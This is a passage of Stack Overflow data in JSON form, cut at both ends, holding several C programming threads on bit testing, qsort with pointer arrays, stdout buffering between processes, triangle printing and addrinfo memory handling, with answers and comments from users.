false, "score": 0, "creation_date": 1543230940, "post_id": 53301720, "comment_id": 93829568, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/184264/discussion-between-gerhardh-and-tsakiroglou-fotis\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 849, "user_id": 4086095, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/CMn9X.jpg?s=128&g=1", "display_name": "Tsakiroglou Fotis", "link": "https://stackoverflow.com/users/4086095/tsakiroglou-fotis"}, "is_accepted": false, "score": 0, "last_activity_date": 1543229152, "last_edit_date": 1543229152, "creation_date": 1542203198, "answer_id": 53301720, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte/53301720#53301720", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>You can just use this function to pass your char and N(number of bit).The function will invoke a bitwise AND filtering out the bit you need to check.</p>\n\n<pre><code>bool check_N_bit(char a_char , int N)\n{\n    if (N&gt;8)\n    {\n        return false;\n    }\n    if ((a_char&amp;(0x01 &lt;&lt; N-1)) &gt; 0)\n    {\n        return true;\n    }\n    else\n    {\n        return false;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 23, "user_id": 10652396, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JbsZU.png?s=128&g=1", "display_name": "Th. R", "link": "https://stackoverflow.com/users/10652396/th-r"}, "is_accepted": false, "score": 2, "last_activity_date": 1542206521, "creation_date": 1542206521, "answer_id": 53302769, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte/53302769#53302769", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>To check a bit if its 0 or 1, you can define a simple macro like:</p>\n\n<pre><code>#define BIT_ISSET(var, pos) (!!((var) &amp; (1ULL&lt;&lt;(pos))))\n</code></pre>\n\n<p>and then use it in if-clauses.</p>\n\n<p>Note the '<strong>!!</strong>' operator, to ensure that it returns 0 or 1.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 9691875, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e6d92e2111b4a5815eceffa88b9d22b?s=128&d=identicon&r=PG&f=1", "display_name": "Sarath ", "link": "https://stackoverflow.com/users/9691875/sarath"}, "is_accepted": false, "score": 1, "last_activity_date": 1542273314, "last_edit_date": 1542273314, "creation_date": 1542207374, "answer_id": 53303039, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte/53303039#53303039", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>To answer your question: which will check the value of 7th bit.  </p>\n\n<pre><code>unsigned char Buffer = 2; //Hope this is what you are looking for \n\nif (((Buffer &gt;&gt; 7) &amp; 0x01) == 1 )\n{\n    printf(\" Bit is 1 \");\n} \nelse\n{\n    printf(\" Bit is 0 \");\n}\n</code></pre>\n\n<p>Similar way if you need to check the value of nth bit, replace 7 in if condition with n.</p>\n"}], "owner": {"reputation": 85, "user_id": 10550010, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/beaffc8d223974260aa18f9b5c12db43?s=128&d=identicon&r=PG&f=1", "display_name": "ddd", "link": "https://stackoverflow.com/users/10550010/ddd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2439, "favorite_count": 1, "accepted_answer_id": 53301215, "answer_count": 5, "score": 1, "last_activity_date": 1543229152, "creation_date": 1542201426, "last_edit_date": 1542201620, "question_id": 53301155, "link": "https://stackoverflow.com/questions/53301155/read-n-bit-from-a-byte", "title": "Read &#39;N&#39; bit from a byte", "body": "<p>I need to read a specific bit from a byte. The value i want to test is 0 or 1.</p>\n\n<pre><code>unsigned char Buffer[0]=2; \n//or binary 0b00000010\n</code></pre>\n\n<p>How can i read n bit from buffer. If it's 0 or 1?\nExample if 7 bit from byte is 0 or 1</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542200663, "post_id": 53300872, "comment_id": 93482268, "body": "the usual way is <code>typedef struct foo_tag { &#47;* ... *&#47; } foo_t;</code> (disclaimer: yes, <code>..._t</code> can conflict with identifiers in POSIX.)"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542200725, "post_id": 53300872, "comment_id": 93482306, "body": "@Swordfish: There&#39;s nothing wrong with separate struct definition and typedef."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1542200758, "post_id": 53300872, "comment_id": 93482320, "body": "@MOehm I didn&#39;t say that it&#39;s wrong. It&#39;s just another source of redundancy and typoes."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1542200909, "post_id": 53300872, "comment_id": 93482399, "body": "That&#39;s subjective and not at all related to the OP&#39;s problem."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1542200933, "post_id": 53300872, "comment_id": 93482420, "body": "@MOehm I respect your opinion."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 1, "creation_date": 1542202845, "post_id": 53300872, "comment_id": 93483689, "body": "You store copies of the cards in your array. I think the idea is not to make copies, but to store pointers to cards that already exist elsewhere, perhaps an array that holds an unshuffled deck of cards. So you should probably pass <code>card_t *c</code> and then just assign <code>new_c = c</code>. (This technique of indirect sorting is especially useful when your objects are big or when you want to keep the array sorted with more than one criterion.)"}, {"owner": {"reputation": 73, "user_id": 10615842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec0522342ae280785b5decb5e0ca5152?s=128&d=identicon&r=PG&f=1", "display_name": "Ilidam", "link": "https://stackoverflow.com/users/10615842/ilidam"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1542203759, "post_id": 53300872, "comment_id": 93484327, "body": "@MOehm Yes, that is right. Just need to store pointers to pointers. &quot;new_c = c&quot; Doesn&#39;t compile. Incompatible types. struct to struct pointer."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1542204163, "post_id": 53300872, "comment_id": 93484584, "body": "In that case, you should also pass a pointer to a card (<code>card_t *c)</code> to the function. Unfortunately, you don&#39;t show the code where cou call <code>add_card_to</code>."}, {"owner": {"reputation": 73, "user_id": 10615842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec0522342ae280785b5decb5e0ca5152?s=128&d=identicon&r=PG&f=1", "display_name": "Ilidam", "link": "https://stackoverflow.com/users/10615842/ilidam"}, "edited": false, "score": 0, "creation_date": 1542205990, "post_id": 53300872, "comment_id": 93485805, "body": "@MOehn The function create a card_t (malloc) and update the value with card_t passed in the function. Maybe I should do something like this &quot;deck-&gt;cards[deck-&gt;n_cards-1] = &amp;new_c;&quot;. But this doesn&#39;t work."}], "answers": [{"comments": [{"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542202874, "post_id": 53301416, "comment_id": 93483712, "body": "Is there a specific reason why you cast <code>a</code> and <code>b</code> to <code>const card_t**</code> and not just <code>card_t**</code> ?"}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "reply_to_user": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542204183, "post_id": 53301416, "comment_id": 93484599, "body": "@luci88filter: it&#39;s just a preference to keep pointers to const if possible, if I am not going to change them. It &quot;documents&quot; the readonly nature of the variable, and you get a <a href=\"https://godbolt.org/z/vzFa0h\" rel=\"nofollow noreferrer\">compiler error</a> if the pointed value gets changed accidentally."}, {"owner": {"reputation": 73, "user_id": 10615842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec0522342ae280785b5decb5e0ca5152?s=128&d=identicon&r=PG&f=1", "display_name": "Ilidam", "link": "https://stackoverflow.com/users/10615842/ilidam"}, "edited": false, "score": 0, "creation_date": 1542206111, "post_id": 53301416, "comment_id": 93485880, "body": "@Groo The sort works. The problem is that it is changing the address of the cards."}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "reply_to_user": {"reputation": 73, "user_id": 10615842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec0522342ae280785b5decb5e0ca5152?s=128&d=identicon&r=PG&f=1", "display_name": "Ilidam", "link": "https://stackoverflow.com/users/10615842/ilidam"}, "edited": false, "score": 0, "creation_date": 1542207837, "post_id": 53301416, "comment_id": 93487069, "body": "@Ilidam: well, the sort only seems like it&#39;s working, because <code>sizeof(card_t*)</code> is accidentally equal to <code>sizeof(card_t)</code> on your machine, so pointers are luckily swapped without screwing everything up. Add an additional field to <code>card_t</code> to test my theory. If you have an array of pointers, <code>qsort</code> will reorder this array of pointers. This is what <code>qsort</code> does. Actual cards will <b>not</b> be moved in memory. If you have an additional set of allocated cards outside <code>add_card_to</code>, and you are <code>malloc</code>ing again, that&#39;s another issue. Impossible to tell without your actual, complete code (a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>)."}], "tags": [], "owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "is_accepted": true, "score": 1, "last_activity_date": 1542209197, "last_edit_date": 1542209197, "creation_date": 1542202262, "answer_id": 53301416, "question_id": 53300872, "link": "https://stackoverflow.com/questions/53300872/assign-a-struct-pointer-to-double-pointer-struct/53301416#53301416", "title": "Assign a Struct Pointer to Double Pointer Struct", "body": "<p>If your goal is to sort <code>hand2-&gt;cards</code>, which is of type <code>card_t **</code>, then you need to pass <code>sizeof(card_t*)</code> to <code>qsort</code>, and make sure your comparison function accepts <code>card_t **</code> as inputs.</p>\n\n<p>I.e.</p>\n\n<pre><code>qsort(hand2-&gt;cards, hand2-&gt;n_cards, sizeof *hand2-&gt;cards, card_ptr_comp);\n</code></pre>\n\n<p>and</p>\n\n<pre><code>int card_ptr_comp(const void * a, const  void * b)\n{\n    const card_t* card_a = *(const card_t**)a;\n    const card_t* card_b = *(const card_t**)b;\n\n    return card_a-&gt;suit - card_b-&gt;suit;\n}\n</code></pre>\n\n<p>(Update) </p>\n\n<p>Perhaps this diagram can clarify what you have allocated, after calling <code>add_card_to</code> three times. You will have <code>deck-&gt;cards</code> point to a chunk in memory containing three pointers, and each of the pointers will point to a separately allocated card.</p>\n\n<p>The <code>qsort</code> call is currently reordering the array of pointers, i.e. <strong>swapping the order of pointers inside the array pointed by <code>deck-&gt;cards</code></strong>. It also works by accident, because <code>sizeof(card_t)</code> is equal to <code>sizeof(card_t*)</code> on your 64-bit machine.</p>\n\n<pre><code>                 card_t**\n *deck           .cards  .n_cards \n +------+       +--------+----+\n |  x---|------&gt;|  x     | 3  |\n +------+       +--------+----+   YOU ARE REORDERING THIS:\n                   |              card_t* card_t* card_t*\n                   |              +-----+-----+-----+\n                   +-------------&gt;|  x  |  y  |  z  |\n                                  +-----+-----+-----+\n                  .value .suit       |     |     |\n                    +----+---+       |     |     |\n                    |    |   |&lt;------+     |     |\n                    +----+---+             |     |\n                                           |     |\n                  .value .suit             |     | \n                    +----+---+             |     |\n                    |    |   |&lt;------------+     |\n                    +----+---+                   |\n                                                 |\n                  .value .suit                   | \n                    +----+---+                   |\n                    |    |   |&lt;------------------+\n                    +----+---+                   \n</code></pre>\n\n<p>Your <code>add_card_to</code> function is also <strong>copying</strong> struct values to the heap-allocated space. This means that the cards added to the deck are not the same cards as in your main program.</p>\n\n<p>If you are also allocating the cards outside this function, then you need to change the function to simply:</p>\n\n<pre><code>void add_card_to(deck_t * deck, card_t * c)\n{\n    deck-&gt;n_cards++;\n    deck-&gt;cards = realloc(...);\n    deck-&gt;cards[deck-&gt;n_cards - 1] = c;\n}\n</code></pre>\n"}], "owner": {"reputation": 73, "user_id": 10615842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec0522342ae280785b5decb5e0ca5152?s=128&d=identicon&r=PG&f=1", "display_name": "Ilidam", "link": "https://stackoverflow.com/users/10615842/ilidam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 251, "favorite_count": 0, "accepted_answer_id": 53301416, "answer_count": 1, "score": 4, "last_activity_date": 1542209197, "creation_date": 1542200475, "question_id": 53300872, "link": "https://stackoverflow.com/questions/53300872/assign-a-struct-pointer-to-double-pointer-struct", "title": "Assign a Struct Pointer to Double Pointer Struct", "body": "<p>The problem: Create a struct with double pointer to be ale to sort the cards without changing the memory location of each card.</p>\n\n<p>The cards are used in other parts of the program.</p>\n\n<p>Diagram:</p>\n\n<pre><code> *deck           .**card    .n_cards \n +------+       +--------+----+\n |  x---|------&gt;|  x     | 3  |\n +------+       +--------+----+\n                   |              +-----+\n                   +-------------&gt;|  x  |\n                                  +-----+\n                  .value .suit       |\n                    +----+---+       |\n                    |    |   |&lt;------+\n                    +----+---+\n                    |    |   |\n                    +----+---+\n                    |    |   |\n                    +----+---+\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>struct card_tag {\n  unsigned value;\n  suit_t suit;\n};typedef struct card_tag card_t;\n\nstruct deck_tag {\n  card_t ** cards;\n  size_t n_cards;\n};\ntypedef struct deck_tag deck_t;\n\nvoid add_card_to(deck_t * deck, card_t c){\n  deck-&gt;n_cards++;\n  deck-&gt;cards = realloc(deck-&gt;cards, (deck-&gt;n_cards)*sizeof(*deck-&gt;cards));\n  card_t * new_c = malloc(sizeof(*new_c));\n  *new_c = c;\n  deck-&gt;cards[deck-&gt;n_cards-1] = new_c;\n  return;\n}\n</code></pre>\n\n<p>The code is compiling without errors, but the sort changes the memory address of the cards.</p>\n\n<p>The way I am using to link the **cards to the struct card is the correct way of doing this?</p>\n\n<p>To sort the cards I'm using qsort.</p>\n\n<pre><code>qsort(hand2-&gt;cards, hand2-&gt;n_cards, sizeof(card_t), card_ptr_comp);\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542203256, "post_id": 53300787, "comment_id": 93483972, "body": "The server can only do the trick if the client runs on the same machine. It\u2019s a moderately putrid trick.  The client should flush its standard output before sending a request to the server. If the server is using file stream I/O, then it needs to flush its redirected output before returning control to the client."}, {"owner": {"reputation": 53, "user_id": 10651854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66a317565cd0dff9e149e448c0b8a424?s=128&d=identicon&r=PG&f=1", "display_name": "Bugsy", "link": "https://stackoverflow.com/users/10651854/bugsy"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542206653, "post_id": 53300787, "comment_id": 93486236, "body": "Yes they are obviously running on the same machine as I make use of the proc fs. I agree that it may not be a perfect solution, but due to the prerequisites of the project the server had to handle the output. I guess that the client has to flush in order to synchronize output with the server, but in this case the client will be completely silent so I guess it means that it not applicable? Based on what you say, I assume that output from the server will go straight to stdout or a file depending on what&#39;s defined in the client, without passing any buffer in the client(?)."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542206800, "post_id": 53300787, "comment_id": 93486344, "body": "The client code will never see any of the output from the server.  It will go direct to the file or device that the client is using as standard output."}, {"owner": {"reputation": 53, "user_id": 10651854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66a317565cd0dff9e149e448c0b8a424?s=128&d=identicon&r=PG&f=1", "display_name": "Bugsy", "link": "https://stackoverflow.com/users/10651854/bugsy"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542207941, "post_id": 53300787, "comment_id": 93487135, "body": "So I guess that as long as the server manage to flush it&#39;s buffer it will be safe for the client to close the file (redirected stdout)? In case anything is missing in the file, it wasn&#39;t properly output/flushed by the server?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542208381, "post_id": 53300787, "comment_id": 93487451, "body": "Probably.  Once the server has the file descriptor for the client\u2019s standard output open, it shouldn\u2019t matter if the client closes its output. And if only the server is writing to the client\u2019s standard output, then any missing information is the server\u2019s problem.  (I still think this is an appallingly awful design. I\u2019m explaining what I believe will happen, but I still think that the design is wrong \u2014 utterly the wrong way to approach the problem.)"}, {"owner": {"reputation": 53, "user_id": 10651854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66a317565cd0dff9e149e448c0b8a424?s=128&d=identicon&r=PG&f=1", "display_name": "Bugsy", "link": "https://stackoverflow.com/users/10651854/bugsy"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1542209590, "post_id": 53300787, "comment_id": 93488130, "body": "Well, I don&#39;t think that anyone would design a client/server solution like this from scratch, but when there are legacy code that can not be changed your options are limited. I&#39;m just happy that I found one solution to the problem, though I still have problems in some rare cases. That&#39;s why I figured I had to understand all the details properly. Thanks!"}], "owner": {"reputation": 53, "user_id": 10651854, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66a317565cd0dff9e149e448c0b8a424?s=128&d=identicon&r=PG&f=1", "display_name": "Bugsy", "link": "https://stackoverflow.com/users/10651854/bugsy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 56, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1542200207, "creation_date": 1542200207, "question_id": 53300787, "link": "https://stackoverflow.com/questions/53300787/which-buffers-to-flush", "title": "Which buffers to flush?", "body": "<p>I'm creating a client/server application in C where I re-use some existing code. Due to this, the server rather than the client is responsible for printing messages to the user. To achieve this, the server has opened stdout of the client by calling fopen() on '/proc//fd/1' and redirected its own stdout to this fd.</p>\n\n<p>I wonder which buffers are involved when the server prints messages to understand what to flush?\nThe server obviously has to flush its own stdout, but will that be enough for the message to appear or will the output just end up at the buffer of the client's stdout?\nDoes the client also have to flush its stdout to make sure that the message is visible for the user?\nWould a call to fsync() for both the server's and client's stdout make any difference?</p>\n\n<p>The reason that I would like to fully understand which buffers are involved is that I've seen problems when the client's stdout is redirected to a file. I've read about the difference in line buffered and fully buffered output, so I suspect that the problem I have is related to the client's redirected stdout.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 5, "creation_date": 1542200343, "post_id": 53300780, "comment_id": 93482086, "body": "Please show us what you tried and how it failed. Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> page first!!"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1542202999, "post_id": 53300780, "comment_id": 93483796, "body": "Here.......where?"}, {"owner": {"reputation": 3, "user_id": 10652049, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf963cb41e7a671c0c6b11549654fd27?s=128&d=identicon&r=PG&f=1", "display_name": "LMF", "link": "https://stackoverflow.com/users/10652049/lmf"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1542210649, "post_id": 53300780, "comment_id": 93488852, "body": "Sorry Sourav, I just posted the code and the result..."}], "answers": [{"tags": [], "owner": {"reputation": 83, "user_id": 3353042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f50abf596887c6ab68f25a6d99ee936?s=128&d=identicon&r=PG&f=1", "display_name": "Szilan", "link": "https://stackoverflow.com/users/3353042/szilan"}, "is_accepted": true, "score": 0, "last_activity_date": 1542201636, "creation_date": 1542201636, "answer_id": 53301205, "question_id": 53300780, "link": "https://stackoverflow.com/questions/53300780/printing-a-triangle-with-3-different-symbols/53301205#53301205", "title": "Printing a triangle with 3 different symbols", "body": "<p>Try working out the pattern on paper first. </p>\n\n<p>For example, the dollar sign starts two rows below the top of the outermost triangle. All subsequent dollar signs are each one column before or one column after the preceding dollar sign. In this way each character of a new line is remotely dependent on the very first character.</p>\n\n<p>Once you understand the underlying pattern, you can start programming the loop.</p>\n"}], "owner": {"reputation": 3, "user_id": 10652049, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf963cb41e7a671c0c6b11549654fd27?s=128&d=identicon&r=PG&f=1", "display_name": "LMF", "link": "https://stackoverflow.com/users/10652049/lmf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 471, "favorite_count": 0, "accepted_answer_id": 53301205, "answer_count": 1, "score": -3, "last_activity_date": 1599131583, "creation_date": 1542200181, "last_edit_date": 1599131583, "question_id": 53300780, "link": "https://stackoverflow.com/questions/53300780/printing-a-triangle-with-3-different-symbols", "title": "Printing a triangle with 3 different symbols", "body": "<p>I've been sent a exercise where I have to print to the console (in C) a triangle using three different symbols in the following way:</p>\n<ol>\n<li><p>The program must ask how many rows the triangle will have.</p>\n</li>\n<li><p>The program will print the triangle in the following way:</p>\n<p><img src=\"https://i.stack.imgur.com/B3dGz.png\" alt=\"1\" /></p>\n</li>\n</ol>\n<p>From outside to inside, the first triangle will be formed of <code>*</code>, the one inside it will be <code>-</code>, the one inside again will be <code>$</code> and then the other way around...</p>\n<p>This is my code:</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nint num = 0; //Var to store the user input.\nint blank;  //Var to store number of blank spaces.\n\nint main() {\n\nprintf(&quot;Number of rows? &quot;);\nscanf(&quot;%d&quot;, &amp;num);\nprintf(&quot;\\n&quot;);\n\nblank = num - 1;\n\n//For loop to print each row of the triangle.\nfor(int k = 1; k &lt;= num; k++) {\n    \n    //For loop to print each blank space.\n    for(int j = 1; j &lt;= blank; j++) {\n        \n        printf(&quot; &quot;);\n    }\n    \n        blank--; //Decrease number of blank spaces.\n    \n    //For loop to print each symbol of the triangle.\n    for(int r = 1; r &lt;= 2 * k - 1; r++) {\n        \n        if(r % 2 == 0) {\n            printf(&quot;-&quot;);\n        }\n        \n        else if(r % 3 == 0) {\n            printf(&quot;$&quot;);\n        }\n        \n        else {\n            printf(&quot;*&quot;);\n        }\n        \n    }\n        \n    printf(&quot;\\n&quot;);\n        \n    }\n    \n    blank = 1;\n    \n    return 0;\n}\n</code></pre>\n<p>And this is what it's printing:</p>\n<p><img src=\"https://i.stack.imgur.com/1KyqD.png\" alt=\"2\" /></p>\n"}, {"tags": ["c", "winsock", "memory-corruption"], "answers": [{"tags": [], "owner": {"reputation": 4425, "user_id": 6277831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1c21010f99314f291650d4cd9e3b2735?s=128&d=identicon&r=PG", "display_name": "lostbard", "link": "https://stackoverflow.com/users/6277831/lostbard"}, "is_accepted": false, "score": 0, "last_activity_date": 1542200763, "creation_date": 1542200763, "answer_id": 53300943, "question_id": 53300622, "link": "https://stackoverflow.com/questions/53300622/c-addrinfo-struct-gets-corrupted-but-heap-is-still-valid/53300943#53300943", "title": "C addrinfo struct gets corrupted. But heap is still valid", "body": "<p>your while (res) is moving the pointer <code>res</code> to other nodes other the origibal one each time you execute line <code>res = res-&gt;ai_next;</code>, but then you call <code>FreeAddrInfo(res);</code> at the end with modified pointer, not the one allocated via GetAddrInfo.</p>\n\n<p>Also, although you don't provide the start of the  lookup_host function, but assuming an inout is ptr, you are setting it to the address of sin_addr from the allocated emory, and then freeing the memory at the end of the function, so it may be used by something else.</p>\n"}, {"tags": [], "owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "is_accepted": true, "score": 0, "last_activity_date": 1542200852, "creation_date": 1542200852, "answer_id": 53300971, "question_id": 53300622, "link": "https://stackoverflow.com/questions/53300622/c-addrinfo-struct-gets-corrupted-but-heap-is-still-valid/53300971#53300971", "title": "C addrinfo struct gets corrupted. But heap is still valid", "body": "<p>It's because you free all the memory associated with the results before you use it. For example <code>ai_canonname</code> is a pointer to a string that is allocated from the heap. The memory containing its bytes is flagged as free for reuse before you exit <code>lookup_host</code>. Your <code>CopyMemory</code> will copy the pointer but not the bytes it points to. </p>\n\n<p>NB you should post the whole of <code>lookup_host</code> including the function definition.</p>\n\n<p>You need to find a way of avoiding the call to <code>FreeAddrInfo</code> until after you are done. Either that or do a deeper copy of the <code>struct</code> including all the things being pointed to which you will find rapidly turns into a rabbit hole.</p>\n\n<p>The way I would do it is to provide a callback function that is called while inside <code>lookup_host</code></p>\n"}, {"tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 0, "last_activity_date": 1542232320, "last_edit_date": 1542232320, "creation_date": 1542231655, "answer_id": 53309124, "question_id": 53300622, "link": "https://stackoverflow.com/questions/53300622/c-addrinfo-struct-gets-corrupted-but-heap-is-still-valid/53309124#53309124", "title": "C 